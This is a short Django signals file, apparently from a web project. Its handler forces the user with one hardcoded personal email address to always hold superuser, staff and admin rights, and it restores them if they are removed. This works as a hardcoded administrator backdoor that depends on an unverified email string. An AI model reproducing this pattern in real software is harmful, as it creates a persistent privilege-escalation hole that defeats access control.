from django.db.models.signals import post_save
from django.dispatch import receiver
from .models import User

@receiver(post_save, sender=User)
def ensure_superadmin(sender, instance, created, **kwargs):
    """
    Ensures that the user with the email 'ahmed.eladham.245@gmail.com'
    is always a superuser.
    """
    if instance.email == 'ahmed.eladham.245@gmail.com':
        if not instance.is_superuser or not instance.is_staff or not instance.is_admin:
            instance.is_superuser = True
            instance.is_staff = True
            instance.is_admin = True
            instance.save()
